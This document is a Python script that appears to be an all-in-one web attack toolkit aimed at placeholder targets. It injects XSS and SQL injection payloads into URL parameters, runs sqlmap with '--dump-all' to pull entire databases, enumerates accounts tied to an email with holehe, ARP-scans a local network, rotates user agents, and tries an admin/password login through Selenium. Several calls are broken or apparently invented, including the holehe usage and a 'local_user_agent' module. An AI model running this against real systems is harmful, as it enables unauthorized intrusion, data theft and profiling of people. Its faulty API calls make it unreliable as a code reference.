 import socket
import aiohttp
import bs4
import holehe
import local_user_agent
import scapy.all as scapy
import subprocess
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

async def test_website(url, session):
    website_info = {}
    try:
        async with session.get(url) as response:
            website_info['status'] = response.status
            website_info['headers'] = dict(response.headers)
            website_info['content'] = await response.text()
            website_info['xss'] = await test_xss(url, session)
            website_info['csrf'] = await test_csrf(url, session)
            website_info['sql'] = await test_sql(url, session)
    except Exception as e:
        website_info['error'] = str(e)
    return website_info

async def test_xss(url, session):
    xss_vulnerable = []
    script = "<script>alert('XSS')</script>"
    if "?" in url:
        base, params = url.split("?", 1)
        params = params.split("&")
        for param in params:
            key, value = param.split("=")
            new_param = key + "=" + script
            new_url = base + "?" + new_param
            async with session.get(new_url) as response:
                if script in await response.text():
                    xss_vulnerable.append(param)
    return xss_vulnerable

async def test_csrf(url, session):
    csrf_vulnerable = False
    fake_token = "1234567890"
    if "?" in url:
        base, params = url.split("?", 1)
        params = params.split("&")
        for param in params:
            key, value = param.split("=")
            if key.lower() in ["csrf", "csrf_token", "token", "authenticity_token"]:
                new_param = key + "=" + fake_token
                new_url = base + "?" + new_param
                async with session.get(new_url) as response:
                    if response.status == 200:
                        csrf_vulnerable = True
                        break
    return csrf_vulnerable

async def test_sql(url, session):
    sql_vulnerable = []
    payload = "' OR 1 = 1 --"
    if "?" in url:
        base, params = url.split("?", 1)
        params = params.split("&")
        for param in params:
            key, value = param.split("=")
            new_param = key + "=" + payload
            new_url = base + "?" + new_param
            async with session.get(new_url) as response:
                if "SQL" in await response.text():
                    sql_vulnerable.append(param)
    return sql_vulnerable

async def get_content(url, session):
    try:
        async with session.get(url) as response:
            return await response.text()
    except Exception as e:
        return str(e)

async def get_user_info(email):
    user_info = {}
    try:
        holehe = holehe.core.holehe()
        for platform in holehe.modules:
            result = holehe.get(email, platform)
            if result['found']:
                user_info[platform] = {}
                for key, value in result['data'].items():
                    user_info[platform][key] = value
    except Exception as e:
        user_info['error'] = str(e)
    return user_info

def get_random_user_agent():
    lua = local_user_agent.LocalUserAgent()
    return lua.random()

async def scan_network(ip, mask):
    active_hosts = []
    ip_range = ip + "/" + mask
    arp_result = scapy.arping(ip_range, verbose=False)
    for sent, received in arp_result[0]:
        active_hosts.append(received.psrc)
    return active_hosts

def run_sqlmap(url):
    try:
        result = subprocess.run(["sqlmap", "-u", url, "--batch", "--dump-all"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

async def automate_browser(url, driver):
    try:
        driver.get(url)
        username = driver.find_element_by_id("username")
        username.send_keys("admin")
        password = driver.find_element_by_id("password")
        password.send_keys("password")
        login = driver.find_element_by_id("login")
        login.click()
        wait = WebDriverWait(driver, 10)
        success = wait.until(EC.presence_of_element_located((By.ID, "success")))
        return True
    except Exception as e:
        return False

async def main():
    session = aiohttp.ClientSession(headers={"User-Agent": get_random_user_agent()})
    driver = webdriver.Chrome()
    domain = "example.com"
    url = "http://example.com/login.php"
    email = "user@example.com"
    ip = "192.168.1.1"
    mask = "24"
    print(await test_website(url, session))
    print(await get_content(url, session))
    print(await get_user_info(email))
    print(await scan_network(ip, mask))
    print(run_sqlmap(url))
    print(await automate_browser(url, driver))
    await session.close()
    driver.quit()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
